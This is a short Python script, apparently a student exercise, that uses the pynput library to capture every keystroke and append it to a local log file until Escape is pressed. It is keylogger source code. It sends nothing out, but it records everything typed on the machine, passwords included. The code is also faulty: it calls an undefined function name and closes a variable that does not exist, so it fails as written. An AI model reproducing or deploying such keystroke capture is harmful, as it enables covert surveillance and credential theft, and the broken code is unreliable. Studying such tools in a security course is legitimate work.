import time
import sys
from pynput import keyboard

def write_to_log(log, text):
    log.write(text)
    log.write('\n')

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    log = open("/Users/victorzhang/Documents/Computing/COMP6411/keylogger/fullLogs.txt", 'a')
    key_name = get_key_name(key)
    writeToLog(log, format(key_name))
    # print('Key {} pressed.'.format(key_name))


    if key_name == 'Key.esc':
        print('Exiting program')
        return False

def main():

    with keyboard.Listener(
        on_press = on_press) as listener:
        listener.join()
        log.close()


main()